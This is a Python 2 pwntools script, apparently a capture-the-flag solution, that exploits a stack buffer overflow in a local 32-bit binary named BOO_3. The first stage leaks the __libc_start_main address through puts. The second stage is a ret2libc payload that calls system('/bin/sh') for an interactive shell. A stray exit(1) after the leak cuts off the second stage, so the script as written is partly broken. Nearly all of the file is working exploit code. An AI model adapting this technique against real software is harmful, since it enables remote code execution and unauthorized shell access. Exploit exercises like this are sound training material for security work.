#!/usr/bin/env python2

# ldd BOO_3
# libc.so.6 => /lib32/libc.so.6 (0xf7cce000)

# readelf -s /lib32/libc.so.6| grep system
# 1537: 00044f10    55 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.0

# readelf -s /lib32/libc.so.6| grep exit
# 150: 00037860    33 FUNC    GLOBAL DEFAULT   14 exit@@GLIBC_2.0

# strings -tx /lib32/libc.so.6| grep "/bin"
# 18c33c /bin/sh

from pwn import *
from LibcSearcher import LibcSearcher

p = process("./BOO_3")
elf = ELF("./BOO_3")

pad = "A" * 512
puts_plt = elf.plt['puts']
libc_start_main_got = elf.got['__libc_start_main']
main = elf.symbols['main']

print "[+] puts_plt = " + hex(puts_plt)
print "[+] libc_start_main_got = " + hex(libc_start_main_got)
print "[+] main = " + hex(main)

payload = flat([pad, puts_plt, main, libc_start_main_got])

print "[x] send payload to leak libc_start_main_addr"
p.recvuntil("Quel est ton nom ?\n")
p.sendline(payload)

print list(p.recv())
libc_start_main_addr = u32(p.recv()[-4:])
print "[+] libc_start_main_addr = " + hex(libc_start_main_addr)
exit(1)

newpad = "A" * 504
libc = ELF("/lib32/libc.so.6")
libcbase = libc_start_main_addr - libc.sym['__libc_start_main']
system_addr = libcbase + libc.sym['system']
binsh_addr = libcbase + libc.search('/bin/sh').next()

payload = flat([newpad, system_addr, 0xdeadbeef, binsh_addr])

p.sendline(payload)

p.interactive()
